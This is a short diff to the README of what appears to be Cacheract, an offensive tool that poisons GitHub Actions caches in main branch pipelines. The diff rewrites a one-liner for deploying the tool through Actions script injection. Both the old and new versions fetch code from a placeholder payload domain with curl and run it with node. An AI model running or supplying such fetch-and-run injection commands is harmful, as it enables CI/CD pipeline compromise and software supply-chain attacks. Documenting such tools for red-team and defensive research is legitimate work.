@@ -180,7 +180,7 @@ node bundle.js
 
 Cacheract handles the rest, including determining if the environment is suitable for implantation and automatically deploying itself into caches after validation.
 
-In an Actions script injection scenario, you could use `$(curl -sSfL https://your-payload-domain.com | node)` to deploy Cacheract. Note that Cacheract is only useful when deployed into main branch pipelines, otherwise it has no more value than running code as part of a Pwn Request.
+In an Actions script injection scenario, you could use `$(curl -sSfL https://your-payload-domain.com > /tmp/run; node /tmp/run)` to deploy Cacheract. Note that Cacheract is only useful when deployed into main branch pipelines, otherwise it has no more value than running code as part of a Pwn Request.
 
 ## Future Work
 
